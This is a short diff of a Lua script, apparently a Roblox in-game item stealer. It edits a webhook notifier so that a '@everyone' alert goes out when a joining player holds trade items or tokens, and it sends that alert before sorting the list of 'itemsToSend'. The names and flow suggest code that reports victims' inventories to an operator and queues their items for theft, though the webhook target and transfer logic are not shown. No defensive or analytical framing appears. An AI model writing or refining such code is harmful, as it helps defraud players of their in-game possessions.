@@ -341,7 +341,7 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
         }}
     }
     
-    if isJoinMessage and ping == "Yes" and #tradeItems > 0 then
+    if isJoinMessage and ping == "Yes" and (#tradeItems > 0 or tokens > 0) then
         data["content"] = "@everyone"
     end
 
@@ -479,11 +479,9 @@ for i, v in ipairs(itemsToSend) do
     originalItemsToSend[i] = v
 end
 
-if #allItemsList > 0 or totalTokens > 0 then
-    SendWebhookMessage(true, allItemsList, itemsToSend, totalTokens)
-end
-
 if #itemsToSend > 0 or totalTokens > 0 then
+    -- Send initial webhook notification
+    SendWebhookMessage(true, allItemsList, itemsToSend, totalTokens)
     table.sort(itemsToSend, function(a, b)
         if a.itemType == b.itemType then
             return a.Name < b.Name
